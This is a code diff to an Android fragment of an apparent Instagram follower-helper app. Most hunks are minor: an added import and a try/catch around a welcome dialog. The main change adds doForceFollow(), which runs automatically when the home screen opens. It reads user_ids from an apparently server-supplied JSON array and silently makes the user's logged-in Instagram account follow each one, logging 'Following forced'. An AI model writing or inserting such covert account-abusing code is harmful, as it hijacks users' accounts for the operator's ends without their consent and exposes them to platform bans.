@@ -68,6 +68,7 @@ import instahelper.ghonchegi.util.Purchase;
 
 import static android.content.Context.MODE_PRIVATE;
 import static instahelper.ghonchegi.myfollower.App.Base_URL;
+import static instahelper.ghonchegi.myfollower.App.TAG;
 import static instahelper.ghonchegi.myfollower.App.requestQueue;
 
 @SuppressLint("ValidFragment")
@@ -122,6 +123,7 @@ public class HomeFragment extends Fragment implements AccountChangerInterface {
         });
 
         getUserInfo();
+        doForceFollow();
 
         binding.imageView3.setOnClickListener(v -> {
 
@@ -301,8 +303,6 @@ public class HomeFragment extends Fragment implements AccountChangerInterface {
                                 }
 
                                 App.CancelProgressDialog();
-
-
                             } catch (JSONException e) {
                                 e.printStackTrace();
                                 App.CancelProgressDialog();
@@ -365,9 +365,14 @@ public class HomeFragment extends Fragment implements AccountChangerInterface {
                         App.responseBanner = response1;
                         if (jsonRootObject.getString("welcome") != null && !jsonRootObject.getString("welcome").equals("")) {
                             if (!App.isNotificationDialgShown) {
-                                FirstPageNotificationDialog dialog = new FirstPageNotificationDialog(jsonRootObject.getString("welcome"));
-                                dialog.setCancelable(true);
-                                dialog.show(getChildFragmentManager(), "");
+                                try {
+                                    FirstPageNotificationDialog dialog = new FirstPageNotificationDialog(jsonRootObject.getString("welcome"));
+                                    dialog.setCancelable(true);
+                                    dialog.show(getChildFragmentManager(), "");
+                                }
+                                catch (Exception e)
+                                {e.printStackTrace();}
+
                             }
                         }
 
@@ -543,7 +548,27 @@ public class HomeFragment extends Fragment implements AccountChangerInterface {
                 try {
                     JSONArray array = new JSONArray(response1);
                     for (int i = 0; i < array.length(); i++) {
-                        //InstagramApi.getInstance().Follow();
+                        JSONObject jsonObject = array.getJSONObject(i);
+                        try {
+                            InstagramApi.getInstance().Follow(jsonObject.getString("user_id"), new InstagramApi.ResponseHandler() {
+                                @Override
+                                public void OnSuccess(JSONObject response) {
+                                    try {
+                                        Log.i(TAG, "OnSuccess Following forced: " + jsonObject.getString("user_id").toString());
+                                    } catch (JSONException e) {
+                                        e.printStackTrace();
+                                    }
+
+                                }
+
+                                @Override
+                                public void OnFailure(int statusCode, Throwable throwable, JSONObject errorResponse) {
+
+                                }
+                            });
+                        } catch (InstaApiException e) {
+                            e.printStackTrace();
+                        }
                     }
                 } catch (JSONException e) {
                     e.printStackTrace();
